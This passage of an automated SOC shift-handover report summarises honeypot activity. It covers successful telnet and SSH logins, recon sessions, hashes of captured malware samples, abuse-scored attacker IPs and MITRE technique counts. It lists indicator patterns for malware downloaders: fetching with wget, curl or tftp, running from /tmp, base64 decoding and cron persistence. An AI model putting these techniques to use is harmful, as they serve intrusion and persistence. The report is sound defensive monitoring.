| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:49` | `cowrie.session.connect` |
| `2026-08-21 18:54:50` | `cowrie.telnet.option` |
| `2026-08-21 18:54:50` | `cowrie.telnet.option` |
| `2026-08-21 18:54:50` | `cowrie.login.success` |
| `2026-08-21 18:54:51` | `cowrie.session.params` |
| `2026-08-21 18:54:51` | `cowrie.log.closed` |
| `2026-08-21 18:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d32fa5e37f7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:49` | `cowrie.session.connect` |
| `2026-08-21 18:54:49` | `cowrie.client.version` |
| `2026-08-21 18:54:49` | `cowrie.client.kex` |
| `2026-08-21 18:54:49` | `cowrie.login.success` |
| `2026-08-21 18:54:50` | `cowrie.session.params` |
| `2026-08-21 18:54:50` | `cowrie.command.input` |
| `2026-08-21 18:54:50` | `cowrie.log.closed` |
| `2026-08-21 18:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bbf0946664

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:51` | `cowrie.session.connect` |
| `2026-08-21 18:54:52` | `cowrie.telnet.option` |
| `2026-08-21 18:54:52` | `cowrie.telnet.option` |
| `2026-08-21 18:54:52` | `cowrie.login.success` |
| `2026-08-21 18:54:53` | `cowrie.session.params` |
| `2026-08-21 18:54:53` | `cowrie.log.closed` |
| `2026-08-21 18:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e5fc003007

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:53` | `cowrie.session.connect` |
| `2026-08-21 18:54:53` | `cowrie.client.version` |
| `2026-08-21 18:54:53` | `cowrie.client.kex` |
| `2026-08-21 18:54:53` | `cowrie.login.success` |
| `2026-08-21 18:54:54` | `cowrie.session.params` |
| `2026-08-21 18:54:54` | `cowrie.command.input` |
| `2026-08-21 18:54:54` | `cowrie.log.closed` |
| `2026-08-21 18:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02eab39ae637

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:53` | `cowrie.session.connect` |
| `2026-08-21 18:54:53` | `cowrie.telnet.option` |
| `2026-08-21 18:54:54` | `cowrie.telnet.option` |
| `2026-08-21 18:54:54` | `cowrie.login.success` |
| `2026-08-21 18:54:55` | `cowrie.session.params` |
| `2026-08-21 18:54:55` | `cowrie.log.closed` |
| `2026-08-21 18:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84a5ea0dd69

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:55` | `cowrie.session.connect` |
| `2026-08-21 18:54:56` | `cowrie.telnet.option` |
| `2026-08-21 18:54:56` | `cowrie.telnet.option` |
| `2026-08-21 18:54:56` | `cowrie.login.success` |
| `2026-08-21 18:54:57` | `cowrie.session.params` |
| `2026-08-21 18:54:57` | `cowrie.log.closed` |
| `2026-08-21 18:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2d0171aceb

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:57` | `cowrie.session.connect` |
| `2026-08-21 18:54:57` | `cowrie.client.version` |
| `2026-08-21 18:54:57` | `cowrie.client.kex` |
| `2026-08-21 18:54:57` | `cowrie.login.success` |
| `2026-08-21 18:54:58` | `cowrie.session.params` |
| `2026-08-21 18:54:58` | `cowrie.command.input` |
| `2026-08-21 18:54:58` | `cowrie.log.closed` |
| `2026-08-21 18:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-280eacd5d492

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:57` | `cowrie.session.connect` |
| `2026-08-21 18:54:58` | `cowrie.telnet.option` |
| `2026-08-21 18:54:59` | `cowrie.telnet.option` |
| `2026-08-21 18:54:59` | `cowrie.login.success` |
| `2026-08-21 18:54:59` | `cowrie.session.params` |
| `2026-08-21 18:54:59` | `cowrie.log.closed` |
| `2026-08-21 18:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9fd405c402

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:54 |
| **Last Seen** | 2026-08-21 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:54:59` | `cowrie.session.connect` |
| `2026-08-21 18:55:00` | `cowrie.telnet.option` |
| `2026-08-21 18:55:01` | `cowrie.telnet.option` |
| `2026-08-21 18:55:01` | `cowrie.login.success` |
| `2026-08-21 18:55:01` | `cowrie.session.params` |
| `2026-08-21 18:55:01` | `cowrie.log.closed` |
| `2026-08-21 18:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4490ace29b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]216` |
| **First Seen** | 2026-08-21 18:55 |
| **Last Seen** | 2026-08-21 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:55:00` | `cowrie.session.connect` |
| `2026-08-21 18:55:00` | `cowrie.client.version` |
| `2026-08-21 18:55:00` | `cowrie.client.kex` |
| `2026-08-21 18:55:01` | `cowrie.login.success` |
| `2026-08-21 18:55:03` | `cowrie.session.params` |
| `2026-08-21 18:55:03` | `cowrie.command.input` |
| `2026-08-21 18:55:03` | `cowrie.log.closed` |
| `2026-08-21 18:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]216` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6e3be3572b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 18:55 |
| **Last Seen** | 2026-08-21 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:55:01` | `cowrie.session.connect` |
| `2026-08-21 18:55:03` | `cowrie.telnet.option` |
| `2026-08-21 18:55:03` | `cowrie.telnet.option` |
| `2026-08-21 18:55:03` | `cowrie.login.success` |
| `2026-08-21 18:55:05` | `cowrie.session.params` |
| `2026-08-21 18:55:05` | `cowrie.log.closed` |
| `2026-08-21 18:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.158.205[.]203` | **6** | 2026-08-21 17:19 | 2026-08-21 17:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-21 16:57 | 2026-08-21 18:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]117` | **4** | 2026-08-21 17:00 | 2026-08-21 18:54 | 0m | 4 | `T1110.001` | 🟢 LOW |
| `190.246.230[.]110` | **3** | 2026-08-21 17:20 | 2026-08-21 17:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]191` | **3** | 2026-08-21 17:32 | 2026-08-21 17:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]108` | **3** | 2026-08-21 17:32 | 2026-08-21 17:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]77` | **3** | 2026-08-21 17:31 | 2026-08-21 17:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.251.153[.]178` | **3** | 2026-08-21 17:42 | 2026-08-21 18:42 | 4m | 0 | `T1592` | 🟢 LOW |
| `45.156.87[.]216` | **2** | 2026-08-21 18:52 | 2026-08-21 18:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | **2** | 2026-08-21 17:07 | 2026-08-21 17:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.216.5[.]76` | **2** | 2026-08-21 17:57 | 2026-08-21 17:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `82.44.212[.]154` | **2** | 2026-08-21 17:57 | 2026-08-21 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.171.236[.]113` | 1 | 2026-08-21 17:19 | 2026-08-21 17:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-08-21 17:23 | 2026-08-21 17:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-08-21 18:04 | 2026-08-21 18:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]29` | 1 | 2026-08-21 18:47 | 2026-08-21 18:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.134.147[.]66` | 1 | 2026-08-21 17:59 | 2026-08-21 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.200.79[.]73` | 1 | 2026-08-21 16:57 | 2026-08-21 16:58 | 12s | 0 | `T1592` | 🟢 LOW |
| `46.59.109[.]4` | 1 | 2026-08-21 17:43 | 2026-08-21 17:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]61` | 1 | 2026-08-21 18:53 | 2026-08-21 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-21 17:52 | 2026-08-21 17:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-21 17:41 | 2026-08-21 17:42 | 63s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.169.73[.]227` | ID | Asia Pacific Network Information Centre | **100** ⚠️ | 1 |
| `42.125.196[.]116` | JP | TOKAI Communications Corporation | **100** ⚠️ | 1 |
| `93.171.184[.]57` | RU | SM Ltd. | **100** ⚠️ | 0 |
| `195.39.242[.]162` | UA | LAMBDA LLC | **100** ⚠️ | 1 |
| `112.164.195[.]219` | KR | Korea Telecom | **100** ⚠️ | 40 |
| `176.103.15[.]75` | UA | CHP Zarko Alexandr Ivanovich | **100** ⚠️ | 1 |
| `2.180.11[.]118` | IR | mashhad dsl | **100** ⚠️ | 0 |
| `65.20.143[.]45` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `90.230.212[.]29` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `190.75.248[.]87` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 195 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 141 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 30 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 30 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 26 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 259 cases |
| Tool 34  | Credential Extractor        | ✅ 213 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (6.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 63 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 16 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 195 priority case(s) shown individually · 22 recon entry/entries in table (12 group(s) consolidating 38 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
